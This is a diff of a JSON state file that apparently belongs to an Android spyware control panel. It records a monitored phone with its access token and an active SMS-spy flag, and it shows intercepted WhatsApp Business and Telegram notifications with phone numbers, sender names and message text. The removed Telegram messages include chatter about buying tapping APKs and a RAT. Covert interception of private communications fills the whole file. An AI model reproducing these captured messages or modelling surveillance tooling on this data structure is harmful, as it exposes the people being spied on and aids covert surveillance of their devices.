@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633098485,
+    "lastSeen": 1775633101539,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎47 pesan dari 4 chat",
+        "time": "08/04 14:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633103575
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-2460-4911",
+        "content": "📡 Undangan admin saluran",
+        "time": "08/04 14:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633103380
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎46 pesan dari 4 chat",
+        "time": "08/04 14:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633101518
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-2460-4911",
+        "content": "Permisi Azx",
+        "time": "08/04 14:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633101497
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎45 pesan dari 4 chat",
+        "time": "08/04 14:24",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633100814
+      },
       {
         "appName": "WA Business",
         "sender": "+62 856-2460-4911",
@@ -4286,46 +4326,6 @@
         "time": "08/04 13:59",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775631586833
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "VIP emng dikit kalo pegaxrat",
-        "time": "08/04 13:59",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631578640
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Alifzx rezz",
-        "content": "Apk sadap atau apk bug",
-        "time": "08/04 13:59",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631568631
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Alifzx rezz",
-        "content": "Belik apk mau gk",
-        "time": "08/04 13:59",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631561254
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Yaelah Mala minta reff",
-        "time": "08/04 13:59",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631546673
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Alifzx rezz",
-        "content": "Mau apk ini gk",
-        "time": "08/04 13:58",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631529743
       }
     ],
     "galleryPhotos": [],
